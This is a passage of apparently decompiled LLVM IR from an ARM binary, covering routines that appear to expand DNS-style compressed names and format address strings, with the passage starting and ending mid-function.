  %v6_1b8b0 = icmp slt i32 %v0_1b8c871, %v1_1b8ac
  br i1 %v6_1b8b0, label %dec_label_pc_1b8b4, label %dec_label_pc_1b8c0

dec_label_pc_1b8b4:                               ; preds = %dec_label_pc_1b8ac
  store i1 %v9_1b8a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1b8a4, label %bb56, label %dec_label_pc_1b94c

bb56:                                             ; preds = %dec_label_pc_1b8b4
  %v1_1b8b8 = load i32, i32* @sb, align 4
  %v2_1b8b8 = trunc i32 %v1_1b8b8 to i8
  %v4_1b8b8 = inttoptr i32 %v2_1b8cc69 to i8*
  store i8 %v2_1b8b8, i8* %v4_1b8b8, align 1
  %v5_1b8b8 = load i32, i32* @r4, align 4
  %v6_1b8b8 = add i32 %v5_1b8b8, 1
  store i32 %v6_1b8b8, i32* @r4, align 4
  br label %dec_label_pc_1b94c

dec_label_pc_1b8c0:                               ; preds = %dec_label_pc_1b8ac, %dec_label_pc_1b8a4, %dec_label_pc_1b89c
  %v2_1b8c0 = icmp eq i32 %v0_1b8c871, 0
  store i1 %v2_1b8c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b8c0, label %dec_label_pc_1b930, label %dec_label_pc_1b8c8

dec_label_pc_1b8c8:                               ; preds = %dec_label_pc_1b8c0
  %v7_1b8c8 = icmp eq i32 %v0_1b8c871, 6
  store i1 %v7_1b8c8, i1* %cpsr_z.global-to-local, align 1
  %v0_1b8cc = load i32, i32* @sb, align 4
  %v1_1b8cc = trunc i32 %v0_1b8cc to i8
  %v3_1b8cc = inttoptr i32 %v2_1b8cc69 to i8*
  store i8 %v1_1b8cc, i8* %v3_1b8cc, align 1
  %v4_1b8cc = load i32, i32* @r4, align 4
  %v5_1b8cc = add i32 %v4_1b8cc, 1
  store i32 %v5_1b8cc, i32* @r4, align 4
  %v0_1b8d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1b8d0, label %dec_label_pc_1b8d4, label %dec_label_pc_1b930

dec_label_pc_1b8d4:                               ; preds = %dec_label_pc_1b8c8
  %v0_1b8d4 = load i32, i32* @r6, align 4
  %v2_1b8d4 = icmp eq i32 %v0_1b8d4, 0
  store i1 %v2_1b8d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b8d4, label %dec_label_pc_1b8dc, label %dec_label_pc_1b930

dec_label_pc_1b8dc:                               ; preds = %dec_label_pc_1b8d4
  %v0_1b8dc = load i32, i32* @r7, align 4
  %v7_1b8dc = icmp eq i32 %v0_1b8dc, 6
  store i1 %v7_1b8dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b8dc, label %dec_label_pc_1b8fc, label %dec_label_pc_1b8e4

dec_label_pc_1b8e4:                               ; preds = %dec_label_pc_1b8dc
  %v7_1b8e4 = icmp eq i32 %v0_1b8dc, 5
  store i1 %v7_1b8e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b8e4, label %dec_label_pc_1b8ec, label %dec_label_pc_1b930

dec_label_pc_1b8ec:                               ; preds = %dec_label_pc_1b8e4
  store i1 %v9_1b8f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1b8f4, label %dec_label_pc_1b8fc, label %dec_label_pc_1b930

dec_label_pc_1b8fc:                               ; preds = %dec_label_pc_1b8ec, %dec_label_pc_1b8dc
  %v2_1b900 = sub i32 %v2_1b7cc, %v5_1b8cc
  %v1_1b904 = add i32 %v2_1b900, -32
  store i32 %v1_1b904, i32* %r2.global-to-local, align 4
  %v0_1b908 = load i32, i32* @r8, align 4
  %v1_1b908 = add i32 %v0_1b908, 12
  store i32 %v1_1b908, i32* %r0.global-to-local, align 4
  %v3_1b910 = call i32 @function_1b614(i32 %v1_1b908, i32 %v5_1b8cc, i32 %v1_1b904)
  store i32 %v3_1b910, i32* %r0.global-to-local, align 4
  %v2_1b914 = icmp eq i32 %v3_1b910, 0
  store i1 %v2_1b914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b914, label %bb57, label %dec_label_pc_1b920

bb57:                                             ; preds = %dec_label_pc_1b8fc
  %v1_1b918 = load i32, i32* @r6, align 4
  store i32 %v1_1b918, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b9c0

dec_label_pc_1b920:                               ; preds = %dec_label_pc_1b8fc
  %v0_1b920 = load i32, i32* @r4, align 4
  store i32 %v0_1b920, i32* @r0, align 4
  %v0_1b924 = call i32 @function_13f70()
  store i32 %v0_1b924, i32* %r0.global-to-local, align 4
  %v0_1b928 = load i32, i32* @r4, align 4
  %v2_1b928 = add i32 %v0_1b928, %v0_1b924
  store i32 %v2_1b928, i32* @r4, align 4
  %v0_1b960.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1b960

dec_label_pc_1b930:                               ; preds = %dec_label_pc_1b8ec, %dec_label_pc_1b8e4, %dec_label_pc_1b8d4, %dec_label_pc_1b8c8, %dec_label_pc_1b8c0
  %v0_1b938 = phi i32 [ %v5_1b8cc, %dec_label_pc_1b8ec ], [ %v5_1b8cc, %dec_label_pc_1b8e4 ], [ %v5_1b8cc, %dec_label_pc_1b8d4 ], [ %v5_1b8cc, %dec_label_pc_1b8c8 ], [ %v2_1b8cc69, %dec_label_pc_1b8c0 ]
  store i32 %v2_1b7cc, i32* @lr, align 4
  %v1_1b934 = load i32, i32* @r5, align 4
  %v4_1b934 = mul i32 %v1_1b934, 4
  %v5_1b934 = add i32 %v4_1b934, %v2_1b7cc
  store i32 %v0_1b938, i32* @r0, align 4
  %v1_1b93c = add i32 %v5_1b934, -32
  %v2_1b93c = inttoptr i32 %v1_1b93c to i32*
  %v3_1b93c = load i32, i32* %v2_1b93c, align 4
  store i32 %v3_1b93c, i32* %r2.global-to-local, align 4
  %v0_1b940 = load i32, i32* @fp, align 4
  %v3_1b944 = call i32 @function_12b40(i32 %v0_1b938, i32 %v0_1b940)
  store i32 %v3_1b944, i32* %r0.global-to-local, align 4
  %v0_1b948 = load i32, i32* @r4, align 4
  %v2_1b948 = add i32 %v0_1b948, %v3_1b944
  store i32 %v2_1b948, i32* @r4, align 4
  br label %dec_label_pc_1b94c

dec_label_pc_1b94c:                               ; preds = %bb56, %dec_label_pc_1b8b4, %dec_label_pc_1b930
  %v3_1b8b829 = phi i32 [ %v6_1b8b8, %bb56 ], [ %v2_1b8cc69, %dec_label_pc_1b8b4 ], [ %v2_1b948, %dec_label_pc_1b930 ]
  %v0_1b94c = load i32, i32* @r5, align 4
  %v1_1b94c = add i32 %v0_1b94c, 1
  store i32 %v1_1b94c, i32* @r5, align 4
  %v0_1b89c.pre = load i32, i32* @r6, align 4
  %v7_1b954 = icmp slt i32 %v1_1b94c, 8
  %v7_1b89c = icmp eq i32 %v0_1b89c.pre, -1
  store i1 %v7_1b89c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b954, label %dec_label_pc_1b89c, label %dec_label_pc_1b958

dec_label_pc_1b958:                               ; preds = %dec_label_pc_1b94c
  br i1 %v7_1b89c, label %.thread2, label %dec_label_pc_1b960

dec_label_pc_1b960:                               ; preds = %dec_label_pc_1b958, %dec_label_pc_1b920
  %v3_1b96c = phi i32 [ %v3_1b8b829, %dec_label_pc_1b958 ], [ %v2_1b928, %dec_label_pc_1b920 ]
  %v0_1b960 = phi i32 [ %v0_1b89c.pre, %dec_label_pc_1b958 ], [ %v0_1b960.pre, %dec_label_pc_1b920 ]
  %v1_1b960 = load i32, i32* @r7, align 4
  %v2_1b960 = add i32 %v1_1b960, %v0_1b960
  %v7_1b964 = icmp eq i32 %v2_1b960, 8
  store i1 %v7_1b964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b964, label %bb58, label %.thread2

bb58:                                             ; preds = %dec_label_pc_1b960
  %v4_1b96c = inttoptr i32 %v3_1b96c to i8*
  store i8 58, i8* %v4_1b96c, align 1
  %v5_1b96c = load i32, i32* @r4, align 4
  %v6_1b96c = add i32 %v5_1b96c, 1
  store i32 %v6_1b96c, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1b960, %dec_label_pc_1b958, %bb58
  %v2_1b974 = phi i32 [ %v3_1b96c, %dec_label_pc_1b960 ], [ %v3_1b8b829, %dec_label_pc_1b958 ], [ %v6_1b96c, %bb58 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1b974 = inttoptr i32 %v2_1b974 to i8*
  store i8 0, i8* %v3_1b974, align 1
  %v4_1b974 = load i32, i32* @r4, align 4
  %v5_1b974 = add i32 %v4_1b974, 1
  store i32 %v2_1b884, i32* @r1, align 4
  %v2_1b97c = load i32, i32* %stack_var_-128, align 4
  store i32 %v2_1b97c, i32* %r2.global-to-local, align 4
  %v2_1b980 = sub i32 %v5_1b974, %v2_1b884
  %v9_1b984 = icmp eq i32 %v2_1b980, %v2_1b97c
  store i1 %v9_1b984, i1* %cpsr_z.global-to-local, align 1
  %tmp75 = icmp ugt i32 %v2_1b980, %v2_1b97c
  br i1 %tmp75, label %dec_label_pc_1b98c, label %dec_label_pc_1b9a0

dec_label_pc_1b98c:                               ; preds = %.thread2
  %v0_1b98c = call i32 @function_12b24()
  store i32 %v0_1b98c, i32* %r0.global-to-local, align 4
  %v0_1b994 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1b994, i32* %r2.global-to-local, align 4
  %v2_1b998 = inttoptr i32 %v0_1b98c to i32*
  store i32 28, i32* %v2_1b998, align 4
  %v0_1b9c0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b9c0

dec_label_pc_1b9a0:                               ; preds = %.thread2
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_1b9a4 = inttoptr i32 %arg3 to i8*
  %v3_1b9a4 = call i32 @function_14210(i8* %v2_1b9a4, i32 %v2_1b884)
  br label %dec_label_pc_1b9a8

dec_label_pc_1b9a8:                               ; preds = %dec_label_pc_1b788, %dec_label_pc_1b9a0
  %storemerge = phi i32 [ %v3_1b794, %dec_label_pc_1b788 ], [ %v3_1b9a4, %dec_label_pc_1b9a0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b9c0

dec_label_pc_1b9b0:                               ; preds = %dec_label_pc_1b77c
  %v0_1b9b0 = call i32 @function_12b24()
  store i32 %v0_1b9b0, i32* %r0.global-to-local, align 4
  %v2_1b9b8 = inttoptr i32 %v0_1b9b0 to i32*
  store i32 97, i32* %v2_1b9b8, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b9c0

dec_label_pc_1b9c0:                               ; preds = %bb57, %dec_label_pc_1b9a8, %dec_label_pc_1b98c, %dec_label_pc_1b9b0
  %v0_1b9c0 = phi i32 [ %v1_1b918, %bb57 ], [ %storemerge, %dec_label_pc_1b9a8 ], [ %v0_1b9c0.pre, %dec_label_pc_1b98c ], [ 0, %dec_label_pc_1b9b0 ]
  store i32 %v0_1b9c0, i32* %r0.global-to-local, align 4
  store i32 %v6_1b758, i32* %r5.global-to-local, align 4
  ret i32 %v0_1b9c0

; uselistorder directives
  uselistorder i32 %v0_1b9c0, { 1, 0 }
  uselistorder i1 %v7_1b89c, { 2, 0, 1 }
  uselistorder i32 %v0_1b89c.pre, { 1, 0, 2 }
  uselistorder i32 %v1_1b94c, { 0, 2, 1 }
  uselistorder i32 %v0_1b938, { 1, 0 }
  uselistorder i32 %v5_1b8cc, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i1 %v9_1b8a4, { 1, 0, 2 }
  uselistorder i32 %v2_1b8cc69, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1b8c871, { 5, 4, 2, 3, 0, 1 }
  uselistorder i1 %v7_1b89c68, { 1, 0 }
  uselistorder i32 %v2_1b884, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_1b894, { 1, 0, 2 }
  uselistorder i1 %v7_1b870, { 1, 0 }
  uselistorder i32 %v0_1b870, { 1, 2, 0 }
  uselistorder i32 %v1_1b894.pre, { 2, 0, 1 }
  uselistorder i32 %v0_1b868.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v7_1b858, { 1, 0 }
  uselistorder i1 %v7_1b850, { 1, 0 }
  uselistorder i32 %v1_1b844, { 1, 0 }
  uselistorder i32 %v0_1b858, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1b86c, { 1, 2, 0, 3 }
  uselistorder i1 %v7_1b80c, { 1, 0 }
  uselistorder i32 %v0_1b844, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_1b828, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1b838, { 3, 1, 0, 2 }
  uselistorder i32 %v1_1b7c8, { 1, 0, 2 }
  uselistorder i32 %v2_1b7b0, { 1, 0 }
  uselistorder i32 %v0_1b7c8, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1b7cc, { 0, 4, 3, 1, 5, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 12, 8, 9, 10, 11, 14, 13, 15, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 22, 14, 15, 16, 17, 18, 23, 19, 20, 21 }
  uselistorder i32 97, { 5, 6, 8, 1, 0, 9, 7, 2, 3, 4 }
  uselistorder i8 58, { 1, 4, 5, 2, 6, 7, 8, 3, 9, 0 }
  uselistorder i32 (i32, i32)* @function_12b40, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_1b614, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b9c0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1b9a8, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b94c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b89c, { 1, 0 }
  uselistorder label %dec_label_pc_1b870._crit_edge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b870, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b868, { 1, 0 }
  uselistorder label %dec_label_pc_1b844, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1b840, { 1, 0 }
  uselistorder label %dec_label_pc_1b7f8, { 1, 0 }
}

define i32 @function_1b9dc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1b9dc:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_1b9dc = load i32, i32* @r5, align 4
  %v0_1b9e0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1b9e0, i32* %sl.global-to-local, align 4
  %v2_1b9e0 = icmp eq i32 %v0_1b9e0, 0
  br i1 %v2_1b9e0, label %.thread30, label %dec_label_pc_1ba08.preheader

.thread30:                                        ; preds = %dec_label_pc_1b9dc
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1bac8

dec_label_pc_1ba08.preheader:                     ; preds = %dec_label_pc_1b9dc
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1ba084 = load i32, i32* @r1, align 4
  %v6_1ba0c14 = icmp slt i32 %v0_1ba084, %arg2
  br i1 %v6_1ba0c14, label %dec_label_pc_1ba10.preheader, label %dec_label_pc_1bac8

dec_label_pc_1ba10.preheader:                     ; preds = %dec_label_pc_1ba08.preheader
  %v2_1ba1051 = add i32 %v0_1b9e0, %v0_1ba084
  %v3_1ba1052 = inttoptr i32 %v2_1ba1051 to i8*
  %v4_1ba1053 = load i8, i8* %v3_1ba1052, align 1
  %v6_1ba1054 = zext i8 %v4_1ba1053 to i32
  store i32 %v6_1ba1054, i32* @r4, align 4
  %v2_1ba1455 = icmp eq i8 %v4_1ba1053, 0
  br i1 %v2_1ba1455, label %bb49, label %dec_label_pc_1ba1c

dec_label_pc_1ba04:                               ; preds = %bb48, %bb44
  %v1_1ba08 = phi i32 [ %v1_1ba08.pre, %bb48 ], [ %v1_1ba3459, %bb44 ]
  %v0_1ba08 = phi i32 [ %v0_1ba08.pre, %bb48 ], [ %v5_1ba4c, %bb44 ]
  %v0_1ba04 = phi i32 [ %v0_1ba04.pre, %bb48 ], [ %v0_1ba5060, %bb44 ]
  store i32 %v0_1ba04, i32* %r0.global-to-local, align 4
  %v6_1ba0c = icmp slt i32 %v0_1ba08, %v1_1ba08
  br i1 %v6_1ba0c, label %dec_label_pc_1ba04.dec_label_pc_1ba10_crit_edge, label %dec_label_pc_1bac8

dec_label_pc_1ba04.dec_label_pc_1ba10_crit_edge:  ; preds = %dec_label_pc_1ba04
  %v0_1ba10.pre = load i32, i32* %sl.global-to-local, align 4
  %v2_1ba10 = add i32 %v0_1ba10.pre, %v0_1ba08
  %v3_1ba10 = inttoptr i32 %v2_1ba10 to i8*
  %v4_1ba10 = load i8, i8* %v3_1ba10, align 1
  %v6_1ba10 = zext i8 %v4_1ba10 to i32
  store i32 %v6_1ba10, i32* @r4, align 4
  %v2_1ba14 = icmp eq i8 %v4_1ba10, 0
  %v0_1bab4 = load i32, i32* @ip, align 4
  %v2_1bab4 = icmp eq i32 %v0_1bab4, 0
  br i1 %v2_1ba14, label %dec_label_pc_1bab4, label %dec_label_pc_1ba1c

dec_label_pc_1ba1c:                               ; preds = %dec_label_pc_1ba10.preheader, %dec_label_pc_1ba04.dec_label_pc_1ba10_crit_edge
  %v2_1bab466 = phi i1 [ %v2_1bab4, %dec_label_pc_1ba04.dec_label_pc_1ba10_crit_edge ], [ false, %dec_label_pc_1ba10.preheader ]
  %v0_1bab464 = phi i32 [ %v0_1bab4, %dec_label_pc_1ba04.dec_label_pc_1ba10_crit_edge ], [ 1, %dec_label_pc_1ba10.preheader ]
  %v6_1ba1063 = phi i32 [ %v6_1ba10, %dec_label_pc_1ba04.dec_label_pc_1ba10_crit_edge ], [ %v6_1ba1054, %dec_label_pc_1ba10.preheader ]
  %v0_1ba3c62 = phi i32 [ %v0_1ba10.pre, %dec_label_pc_1ba04.dec_label_pc_1ba10_crit_edge ], [ %v0_1b9e0, %dec_label_pc_1ba10.preheader ]
  %v0_1ba2c61 = phi i32 [ %v0_1ba08, %dec_label_pc_1ba04.dec_label_pc_1ba10_crit_edge ], [ %v0_1ba084, %dec_label_pc_1ba10.preheader ]
  %v0_1ba5060 = phi i32 [ %v0_1ba04, %dec_label_pc_1ba04.dec_label_pc_1ba10_crit_edge ], [ 0, %dec_label_pc_1ba10.preheader ]
  %v1_1ba3459 = phi i32 [ %v1_1ba08, %dec_label_pc_1ba04.dec_label_pc_1ba10_crit_edge ], [ %arg2, %dec_label_pc_1ba10.preheader ]
  %v1_1ba20 = and i32 %v6_1ba1063, 192
  br i1 %v2_1bab466, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_1ba1c
  %v1_1ba24 = load i32, i32* %r8.global-to-local, align 4
  %v2_1ba24 = add i32 %v1_1ba24, 1
  store i32 %v2_1ba24, i32* %r8.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_1ba1c, %bb
  %v2_1ba28 = icmp eq i32 %v1_1ba20, 192
  %v1_1ba2c = add i32 %v0_1ba2c61, 1
  store i32 %v1_1ba2c, i32* %r1.global-to-local, align 4
  br i1 %v2_1ba28, label %dec_label_pc_1ba34, label %dec_label_pc_1ba5c

dec_label_pc_1ba34:                               ; preds = %bb42
  %v6_1ba38 = icmp slt i32 %v1_1ba2c, %v1_1ba3459
  br i1 %v6_1ba38, label %dec_label_pc_1ba3c, label %dec_label_pc_1bac8

dec_label_pc_1ba3c:                               ; preds = %dec_label_pc_1ba34
  %v2_1ba3c = add i32 %v1_1ba2c, %v0_1ba3c62
  %v3_1ba3c = inttoptr i32 %v2_1ba3c to i8*
  %v4_1ba3c = load i8, i8* %v3_1ba3c, align 1
  %v6_1ba3c = zext i8 %v4_1ba3c to i32
  %v1_1ba44 = urem i32 %v6_1ba1063, 64
  br i1 %v2_1bab466, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_1ba3c
  %v1_1ba48 = load i32, i32* %r8.global-to-local, align 4
  %v2_1ba48 = add i32 %v1_1ba48, 1
  store i32 %v2_1ba48, i32* %r8.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_1ba3c, %bb43
  %v4_1ba4c = mul nuw nsw i32 %v1_1ba44, 256
  %v5_1ba4c = or i32 %v6_1ba3c, %v4_1ba4c
  store i32 %v5_1ba4c, i32* %r1.global-to-local, align 4
  store i32 %v0_1ba5060, i32* %r7.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_1ba04

dec_label_pc_1ba5c:                               ; preds = %bb42
  %v2_1ba5c = add i32 %v6_1ba1063, %v0_1ba5060
  store i32 %v2_1ba5c, i32* %r6.global-to-local, align 4
  %v3_1ba60 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1ba60, i32* @r3, align 4
  %v1_1ba64 = add i32 %v2_1ba5c, 1
  store i32 %v1_1ba64, i32* %r7.global-to-local, align 4
  %v3_1ba68 = icmp ult i32 %v1_1ba64, %v3_1ba60
  br i1 %v3_1ba68, label %dec_label_pc_1ba70, label %dec_label_pc_1bac8

dec_label_pc_1ba70:                               ; preds = %dec_label_pc_1ba5c
  %v2_1ba70 = add i32 %v6_1ba1063, %v1_1ba2c
  store i32 %v2_1ba70, i32* @r5, align 4
  %v3_1ba74 = icmp ult i32 %v2_1ba70, %v1_1ba3459
  br i1 %v3_1ba74, label %dec_label_pc_1ba7c, label %dec_label_pc_1bac8

dec_label_pc_1ba7c:                               ; preds = %dec_label_pc_1ba70
  %v2_1ba7c = add i32 %v1_1ba2c, %v0_1ba3c62
  store i32 %v2_1ba7c, i32* @r1, align 4
  %v0_1ba80 = load i32, i32* %sb.global-to-local, align 4
  %v2_1ba80 = add i32 %v0_1ba80, %v0_1ba5060
  store i32 %v2_1ba80, i32* @r0, align 4
  store i32 %v6_1ba1063, i32* @r2, align 4
  %v0_1ba8c = call i32 @function_14000()
  store i32 %v0_1ba8c, i32* %r0.global-to-local, align 4
  store i32 %v0_1bab464, i32* @ip, align 4
  %v0_1ba94 = load i32, i32* %sl.global-to-local, align 4
  %v1_1ba94 = load i32, i32* @r5, align 4
  %v2_1ba94 = add i32 %v1_1ba94, %v0_1ba94
  %v3_1ba94 = inttoptr i32 %v2_1ba94 to i8*
  %v4_1ba94 = load i8, i8* %v3_1ba94, align 1
  br i1 %v2_1bab466, label %bb46, label %bb45

bb45:                                             ; preds = %dec_label_pc_1ba7c
  %v1_1ba9c = load i32, i32* %r8.global-to-local, align 4
  %v2_1ba9c = load i32, i32* @r4, align 4
  %v3_1ba9c = add i32 %v2_1ba9c, %v1_1ba9c
  store i32 %v3_1ba9c, i32* %r8.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_1ba7c, %bb45
  %v2_1baa0 = icmp eq i8 %v4_1ba94, 0
  br i1 %v2_1baa0, label %bb48, label %bb47

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_1baac.off0 = phi i8 [ 0, %bb46 ], [ 46, %bb47 ]
  store i32 %v1_1ba94, i32* %r1.global-to-local, align 4
  %v2_1baac = load i32, i32* %sb.global-to-local, align 4
  %v3_1baac = load i32, i32* %r6.global-to-local, align 4
  %v4_1baac = add i32 %v3_1baac, %v2_1baac
  %v5_1baac = inttoptr i32 %v4_1baac to i8*
  store i8 %v0_1baac.off0, i8* %v5_1baac, align 1
  %v0_1ba04.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1ba08.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1ba08.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1ba04

dec_label_pc_1bab4:                               ; preds = %dec_label_pc_1ba04.dec_label_pc_1ba10_crit_edge
  %v0_1babc.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1bab4, label %dec_label_pc_1bac8, label %bb49

bb49:                                             ; preds = %dec_label_pc_1ba10.preheader, %dec_label_pc_1bab4
  %v0_1babc.pre69 = phi i32 [ %v0_1babc.pre.pre, %dec_label_pc_1bab4 ], [ 0, %dec_label_pc_1ba10.preheader ]
  %v2_1bab8 = add i32 %v0_1babc.pre69, 1
  store i32 %v2_1bab8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1bac8

dec_label_pc_1bac8:                               ; preds = %dec_label_pc_1ba70, %dec_label_pc_1ba5c, %dec_label_pc_1ba34, %dec_label_pc_1ba04, %dec_label_pc_1bab4, %dec_label_pc_1ba08.preheader, %bb49, %.thread30
  %storemerge = phi i32 [ -1, %.thread30 ], [ %v2_1bab8, %bb49 ], [ -1, %dec_label_pc_1ba08.preheader ], [ %v0_1babc.pre.pre, %dec_label_pc_1bab4 ], [ -1, %dec_label_pc_1ba5c ], [ -1, %dec_label_pc_1ba70 ], [ -1, %dec_label_pc_1ba04 ], [ -1, %dec_label_pc_1ba34 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_1b9dc, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1babc.pre.pre, { 1, 0 }
  uselistorder i32 %v1_1ba94, { 1, 0 }
  uselistorder i32 %v5_1ba4c, { 1, 0 }
  uselistorder i32 %v1_1ba2c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1ba5060, { 3, 2, 0, 1 }
  uselistorder i32 %v6_1ba1063, { 2, 4, 3, 0, 1 }
  uselistorder i1 %v2_1bab466, { 1, 2, 0 }
  uselistorder i32 %v0_1b9e0, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1bac8, { 6, 4, 0, 1, 2, 3, 5, 7 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_1ba1c, { 1, 0 }
}

define i32 @function_1bad4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1bad4:
  %cpsr_c.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp145 = call i32 @__decompiler_undefined_function_0()
  %tmp160 = call i32 @__decompiler_undefined_function_0()
  %tmp161 = call i32 @__decompiler_undefined_function_0()
  %tmp162 = call i32 @__decompiler_undefined_function_0()
  %tmp173 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-104 = alloca i16, align 2
  %stack_var_-76 = alloca i32, align 4
  %v3_1bad4 = load i32, i32* @r4, align 4
  %v6_1bad4 = load i32, i32* @r5, align 4
  %v9_1bad4 = load i32, i32* @r6, align 4
  %v12_1bad4 = load i32, i32* @r7, align 4
  %v15_1bad4 = load i32, i32* @r8, align 4
  %v18_1bad4 = load i32, i32* @sb, align 4
  %v21_1bad4 = load i32, i32* @sl, align 4
  %v24_1bad4 = load i32, i32* @fp, align 4
  %v27_1bad4 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg4, i32* @fp, align 4
  %v0_1bae8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1baf0 = call i32 @function_14ccc(i32 512)
  store i32 %v1_1baf0, i32* @sl, align 4
  %v0_1baf8 = load i32, i32* @r4, align 4
  store i32 %v0_1baf8, i32* @r0, align 4
  %v0_1bafc = call i32 @function_13f70()
  store i32 894, i32* %r3.global-to-local, align 4
  %v3_1bb08 = icmp ugt i32 %v0_1bafc, 893
  store i1 %v3_1bb08, i1* %cpsr_c.global-to-local, align 1
  store i32 180260, i32* @r8, align 4
  %tmp286 = icmp ugt i32 %v0_1bafc, 894
  br i1 %tmp286, label %.thread133, label %dec_label_pc_1bb28

